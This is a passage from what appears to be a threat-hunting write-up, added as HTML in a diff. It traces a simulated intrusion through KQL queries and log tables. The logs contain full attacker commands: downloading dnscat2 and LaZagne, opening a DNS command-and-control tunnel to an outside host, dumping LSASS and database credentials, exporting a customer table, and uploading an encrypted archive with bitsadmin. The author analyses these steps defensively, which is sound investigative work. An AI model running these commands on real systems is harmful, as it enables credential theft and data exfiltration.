+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dcustomer%2BPII</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 13:59:32.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dmailing%2Blist</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 14:00:14.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dwhy%2Bare%2Bpeople%2Bposting%2Btheir%2Bfeet%2Bon%2Bthis%2Bwebsite%2Bomg</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 14:00:51.0000</td>
+                    <td>GET</td>
+                    <td>193.233.125.78</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/contact/customer-service/contact-form</td>
+                    <td>https://duckduckgo.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 14:01:33.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/contact/customer-service/contact-form/upload</td>
+                    <td>https://instructure.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 14:02:13.0000</td>
+                    <td>GET</td>
+                    <td>193.233.125.78</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/contact/customer-service/contact-form/upload%3Dholesinmysocks.jpeg</td>
+                    <td>https://office.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 14:02:52.0000</td>
+                    <td>GET</td>
+                    <td>193.233.125.78</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/contact/customer-service/contact-form/upload%3Dholesinmysocks.jpeg%26status%3Dsuccess</td>
+                    <td>https://ebay.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 14:03:29.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dshady%2Bdeals</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 14:40:29.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dcotton%2Borigin</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 14:41:29.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3Dthe%2Bsock%2Bis%2Ba%2Blie</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 15:26:29.0000</td>
+                    <td>GET</td>
+                    <td>45.134.232.69</td>
+                    <td>Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_5 rv:3.0; el-CY) AppleWebKit/534.42.3 (KHTML, like Gecko) Version/4.1 Safari/534.42.3</td>
+                    <td>https://jusdechaussette.fr/search%3DCho%2BCetkipu%2Bis%2Ba%2Bfraud</td>
+                    <td>https:jusdechaussette.fr/search</td>
+                    <td>200</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The queries are for a variety of things, including casting doubt on the quality of Jus de Chaussette's product, checking articles on the French President's endorsement of the brand, how to file a complaint, how to contact customer service (which would include Mike Oz), trying to find the customer database or any customer PII in the Jus de Chaussette servers, and any mailing lists the company may have. They eventually find a link to a Contact Form, in which they upload a file named <samp>holesinmysocks.jpeg</samp> on 2024-08-18 at 14:02:52 in the afternoon--the day before "Mike Oz" sent the first email to the CFO. Even after that, there are queries questioning the sourcing of the cotton used for manufacturing the socks.</p>
+          <p>With such a clear hint of what happened, I checked what happened in Mike Oz's device around the time the <samp>holesinmysocks.jpeg</samp> file was downloaded to their computer--since their account was compromised, it's likely because this file dropped something on their computer.</p>
+          <pre><kbd>ProcessEvents
+| where username == "mioz"
+| where timestamp >= datetime(2024-08-18 14:02:52.0000)
+| where process_commandline !contains "Edge"
+and process_commandline !contains "Teams"
+and process_commandline !contains "WindowsApps"
+and process_commandline !contains "SystemApps"</kbd></pre>
+          <details open id="results8">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>hostname</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-18 16:10:29.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>holesinmysocks.jpeg</td>
+                    <td>explorer.exe</td>
+                    <td>042d1eb353c966938bf93fdf56a37a088a918bee219e8384092c09b4dacab0d9</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 16:58:29.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Invoke-WebRequest -Uri https://downloads.skullsecurity.org/dnscat2.zip -OutFile C:\Users\mioz\downloads\dnscat2.zip</td>
+                    <td>powershell.exe</td>
+                    <td>eac2546a14f9284b0ffbb4f4c0e6fd00cd9fc1f15e3b6194cdb10ab76a886fb7</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 16:59:29.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>./dnscat2 thesockwhisperer.com</td>
+                    <td>cmd.exe</td>
+                    <td>9c3f630fb85b0616d818c52497abd1813b13aeecc2db11b964fcd9972ef007a1</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 17:16:33.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>whoami</td>
+                    <td>cmd.exe</td>
+                    <td>e1b705ffe75332c1f251c2e8f16301fd0fd5fc66750d0c434a24977733028986</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 17:30:29.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Invoke-WebRequest -Uri https://github.com/AlessandroZ/LaZagne/download/laZagne.exe -OutFile C:\Users\mioz\downloads\laZagne.exe</td>
+                    <td>powershell.exe</td>
+                    <td>fa41e3f1a707893875af72648169f5e84ab5bea98290dd1e356404ab773eb77a</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 17:34:33.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net user</td>
+                    <td>cmd.exe</td>
+                    <td>ee8f750c27018f14046a3897e82191ea94890978fdd7b3a1a3261b6dc7eda66c</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 18:20:33.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net view</td>
+                    <td>cmd.exe</td>
+                    <td>ffb5a555bc34c7c26e7d36c1bd6427ce1671f294ead302e7fdc4873c67f43064</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 19:17:33.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net share</td>
+                    <td>cmd.exe</td>
+                    <td>c8ba941326467c712e4459d3306680ff8bf5f805984b7964cc33473f2ac54697</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 19:55:33.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>wmic product get name</td>
+                    <td>cmd.exe</td>
+                    <td>94ba1ae4cd17e7a8be724adfc48a46f635e0b5893ed1220f39b62299af73ba40</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 20:13:17.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>LaZagne.exe databases -dbvis</td>
+                    <td>cmd.exe</td>
+                    <td>ba92a9eb09254b381a5e967b2ea019ed9fc3ae9e6c6ae2819231bf7dd8f8037b</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 20:46:27.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>LaZagne.exe windows -pypykatz -oN -output C:\Users\mioz\Downloads\creds.txt</td>
+                    <td>cmd.exe</td>
+                    <td>c7c8341af8569ea82e372f50d670ccbde206027eb3891dedf298033be18aff09</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-18 21:34:16.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>@export on; @export set filename="C:\Users\mioz\Downloads\Customers.csv"; select * from Customers; @export off;</td>
+                    <td>dbviscmd.bat</td>
+                    <td>b9415aa8f4f64e2716e045a5e27e2485c923729fcaf59d48cefa6b0fa24a30e1</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-19 12:37:12.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>rar a -df -hp sn3@ky C:\Users\mioz\Downloads\feetlover.rar C:\Users\mioz\Downloads\Customers.csv</td>
+                    <td>cmd.exe</td>
+                    <td>a4d1c3a067cd6e3f4cfa6b78e858d65529b4892a72f5c82c392dd25885e48c74</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-19 13:29:46.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /create tiptoeing</td>
+                    <td>cmd.exe</td>
+                    <td>0ef95713a7fba8297b48a02b6279af2d0148c0e10b12a87d3899dea92a8bae34</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-19 13:32:18.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /transfer tiptoeing /upload https://liarliarsocksonfire.net/wegotthegoods/feetlover.rar C:\Users\mioz\downloads\feetlover.rar</td>
+                    <td>cmd.exe</td>
+                    <td>79101b1b0faec987268ad690b7ddd6078afb6c2466dc2957155617c1d936dfbb</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-19 13:36:29.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>bitsadmin /complete tiptoeing</td>
+                    <td>cmd.exe</td>
+                    <td>d55ecd15b8ac05d72cf1d15d94bd1b570215dec19a631e8a3d67cff96fa1e864</td>
+                    <td>7SSS-DESKTOP</td>
+                    <td>mioz</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>This file turns out not to be an image file at all, but rather a text file masquerading as one. After the target opens the malicious <samp>.jpeg</samp> file...</p>
+          <ol>
+            <li>...a PowerShell script is dropped (named <samp>talking_socks.ps1</samp>, as confirmed in <samp>FileCreationEvents</samp>) and executed.</li>
+            <li>This, in turn, downloads, extracts and executes <samp>dnscat2</samp> from downloads.skullsecurity.org. This is a <a href="https://github.com/iagox86/dnscat2">legitimate tool</a> by <a href="https://skullsecurity.org">Ron Bowes</a> (iagox86 on GitHub), described on its GitHub page as a tool <quote>designed to create an encrypted command-and-control (C&amp;C) channel over the DNS protocol, which is an effective tunnel out of almost every network</quote>; the tool is used to create said encrypted C2 channel on Mike Oz's computer, granting hands-on-keyboard access.</li>
+            <li>They use this access to first run <samp>whoami</samp>, a discovery command.</li>
+            <li>This is followed by downloading LaZagne off <a href="https://github.com/AlessandroZ/LaZagne">its Github page</a> in the same manner as dnscat2. This is <quote>an open source application used to retrieve lots of passwords stored on a local computer</quote>.</li>
+            <li>They follow this by a standard set of discovery commands: <samp>net user</samp>, <samp>net view</samp>, <samp>net share</samp>, <samp>wmic product get name</samp>, the latter gets the name of all installed software; <samp>wmic</samp> was a command line tool for Windows Management Instrumentation (WMI) [<a href="https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic">Microsoft Learn</a>], and using this command, they can learn things such as database software being used.</li>
+            <li>Afterwards, they use LaZagne to dump credentials for the databases and any credentials off LSASS (Local Security Authority Server Service), which saves credentials in memory [<a href="https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#BKMK_LSA">Microsoft Learn</a>].</li>
+            <li>Finally, they run <samp>dbviscmd.bat</samp> (<a href="https://www.dbvis.com/docs/ug/command-line-interface/">a legitimate command line interface for DbVisualizer</a>) to dump the <samp>Customers</samp> database contents to a file named <samp>Customers.csv</samp>, which is likely full of sensitive data.</li>
+          </ol>
+          <p>Afterwards, they use the same <samp>rar</samp> as before (see <a href="#results2">[2]</a>) to compress and encrypt the file before uploading it to their server using <samp>bitsadmin</samp>.</p>
+          <p>Since there are no other signs of activity in Mike Oz's computer, it's time to pivot to checking the CFO and CEO's devices, seeing how they downloaded malicious files sent by "Mike Oz" (see <a href="#results6">[6]</a>).</p>
+          <pre><kbd>FileCreationEvents
+| where filename =~ "decision.docx"</kbd></pre>
+          <details open id="results9">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>hostname</th>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-19 15:10:12.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>e84012727be100a14d8da8fae31d92ec76d449c82d361acbb852ad9afa1d9328</td>
+                    <td>"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\chcetkipu\Downloads\decision.docx"</td>
+                    <td>WINWORD.EXE</td>
+                    <td>00e659e3b539afbfbd94c5b886d87e5b4b29cc9c6344b207080a2b580cd07259</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-19 15:10:13.0000</td>
+                    <td>WINWORD.EXE</td>
+                    <td>9e08a6bd9b47a4a9f88ca7d3f4e15bf5fe374dfb856d8ec4768c9f41b54c9547</td>
+                    <td>C:\Users\chcetkipu\Downloads\talking_socks.ps1</td>
+                    <td>talking_socks.ps1</td>
+                    <td>27d875b422f0bc7a339184f557f2fe65c9a208f752f03bae2ffeaecfbf454b1c</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-19 15:20:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Invoke-WebRequest -Uri https://downloads.skullsecurity.org/dnscat2.zip -OutFile C:\Users\chcetkipu\downloads\dnscat2.zip</td>
+                    <td>powershell.exe</td>
+                    <td>ca51d0a0b66372e883777a172bba8a170de7ba6fc1ab6d6be7a2fa26b125758c</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-19 16:13:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>./dnscat2 thesockwhisperer.com</td>
+                    <td>cmd.exe</td>
+                    <td>81564154c486799e03501a3c9414f6b8dafd4a758b21bc66b26dfecf2ae501dc</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-19 17:01:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Invoke-WebRequest -Uri https://github.com/AlessandroZ/LaZagne/download/laZagne.exe -OutFile C:\Users\chcetkipu\downloads\laZagne.exe</td>
+                    <td>powershell.exe</td>
+                    <td>20c26c6ee1830573e169b52cb3b6c22eef8561f4a378cc7fdf282e098f75f4c0</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-20 16:03:28.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>whoami</td>
+                    <td>cmd.exe</td>
+                    <td>9d6b7a0f6d15faa66197c68da82969c5047fcb1c8d07f8069e2b7217f7cb0aa1</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-20 16:45:28.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net user</td>
+                    <td>cmd.exe</td>
+                    <td>f3efca8aca8cfe9a54e9d6ac121d3d21d03116dc482c54741ecadd206bea8137</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-20 17:12:28.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net view</td>
+                    <td>cmd.exe</td>
+                    <td>987713288f8a377964ebf3fadef105b723fb6eed9baedd46d256d0440da84e60</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-20 17:47:28.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net share</td>
+                    <td>cmd.exe</td>
+                    <td>ad82b439f52b62698855dc059f73ad858a355a329587d7bec9222ed261e71e94</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-20 18:45:28.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>wmic product get name</td>
+                    <td>cmd.exe</td>
+                    <td>5d68b5d5cfbee471031597da65e65c6eaf76d50346f62f988aaf43445b1d6f12</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-20 19:04:46.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>LaZagne.exe windows -pypykatz -oN -output C:\Users\chcetkipu\Downloads\creds.txt</td>
+                    <td>cmd.exe</td>
+                    <td>b433793dbd62db22c28d4015fcb1020ca7b4b2aa73bd15f99c1ffeedfa35ac26</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>SCHR-MACHINE</td>
+                    <td>2024-08-20 19:57:30.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>C:\Windows\Explorer.EXE</td>
+                    <td>dbviscmd.bat</td>
+                    <td>3988b17aafea0f87d680f545919238426e9f58da75f45c9526c35fc90827e730</td>
+                    <td>chcetkipu</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-19 14:52:49.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>b8754bc70053e026a5a273fcd9753d971fd58cb11fdd4e434be57fa5e4fc91a8</td>
+                    <td>"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\brentoe\Downloads\decision.docx"</td>
+                    <td>WINWORD.EXE</td>
+                    <td>ad2f8ed57acece4d79755623e0bc73795134a4110733fd65fbce4993ba42895f</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-19 14:52:50.0000</td>
+                    <td>WINWORD.EXE</td>
+                    <td>28a68ce810484e4396fd0f354a28ac8ec25e84411b3c0b33309fcbbd5e7c6577</td>
+                    <td>C:\Users\brentoe\Downloads\talking_socks.ps1</td>
+                    <td>talking_socks.ps1</td>
+                    <td>e26d40c010c04e927616bb6598a54f0d601a3469546b0afc3a03854434794b12</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-19 15:30:50.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Invoke-WebRequest -Uri https://downloads.skullsecurity.org/dnscat2.zip -OutFile C:\Users\brentoe\downloads\dnscat2.zip</td>
+                    <td>powershell.exe</td>
+                    <td>5c4aa6e1ac33b606f680213a7b9291ce1be6fc6803a6cca6f7b655edcb1100ac</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-19 15:53:50.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>./dnscat2 thesockwhisperer.com</td>
+                    <td>cmd.exe</td>
+                    <td>90273b9563e30bfdd2d8b59ef7e086f3883edc0f1c1b5417f6589a1379cec9c2</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-19 16:26:50.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Invoke-WebRequest -Uri https://github.com/AlessandroZ/LaZagne/download/laZagne.exe -OutFile C:\Users\brentoe\downloads\laZagne.exe</td>
+                    <td>powershell.exe</td>
+                    <td>5dfa9368baa00cb71b395be9db3319ee42fb50c46299cb3a8ab493afb0448eb9</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-20 16:02:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>whoami</td>
+                    <td>cmd.exe</td>
+                    <td>adc3383934e8e6fa9eb48b9af6472cc040491feead832c97e592f9e1f1850434</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-20 16:11:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net user</td>
+                    <td>cmd.exe</td>
+                    <td>dd6b971538a2565fa9195d94a1baf481885439063420a25b8206916eb71fb1df</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-20 16:27:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net view</td>
+                    <td>cmd.exe</td>
+                    <td>6f411997fe3f0117771b3d1741ae1485e7b2ff2fd01848960a51962e4b1a9be6</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-20 16:56:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net share</td>
+                    <td>cmd.exe</td>
+                    <td>ffbed5cd9470c570be393f9d0ce7845183d99213de6ffd9e82e78cd860439fe7</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-20 17:21:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>wmic product get name</td>
+                    <td>cmd.exe</td>
+                    <td>a842a12daef28435a11b122892a89e4b04e5d3587e5ef4cf62b2eda7a55f822a</td>
+                    <td>brentoe</td>
+                  </tr>
+                  <tr>
+                    <td>9RGD-MACHINE</td>
+                    <td>2024-08-20 17:45:18.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>LaZagne.exe windows -pypykatz -oN -output C:\Users\brentoe\Downloads\creds.txt</td>
+                    <td>cmd.exe</td>
+                    <td>6cec082245b2b79203b5d5aad5b91402e1c456eac11487ea9feb4c334736170a</td>
+                    <td>brentoe</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Indeed, the <samp>decision.docx</samp> file drops the same PowerShell script, though this time the threat actors seem mostly content to just dump the credentials using LaZagne. There are no further signs of activity until 2024-08-30 at 18:50:58 in the afternoon, when the threat actors return and use their hands-on-keyboard access to exfiltrate information from the CFO and CEO's computers and the Jus de Chaussette servers--likely documents only the CEO and CFO would have access to (see <a href="#results2">[2]</a>).</p>
+          <p>In brief:</p>
+          <ul>
